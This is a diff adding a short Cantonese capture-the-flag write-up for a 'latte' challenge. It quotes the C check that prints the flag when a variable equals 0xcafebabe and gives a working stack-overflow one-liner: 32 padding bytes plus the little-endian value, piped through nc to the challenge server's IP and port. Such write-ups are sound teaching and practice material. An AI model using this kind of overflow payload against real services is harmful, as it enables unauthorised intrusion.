@@ -178,7 +178,16 @@
 
 
 ## **write-up:**
-
+>留意到 latte.c 中有 floor == 0xcafebabe
+>
+>if (floor == 0xcafebabe)</br>
+>    {</br>
+>        puts("Thanks for your latte! You deserve for the flag!");</br>
+>        system("cat flag.txt");</br>
+>    }</br>
+>    
+>只要令到 latte 執行時 overflow 後就可以行 system("cat flag.txt"); 睇flag!
+>
 >python2 -c "print 'A' * 32 + '\xBE\xBA\xFE\xCA'" | nc 52.175.52.175 39002
 > 
 >
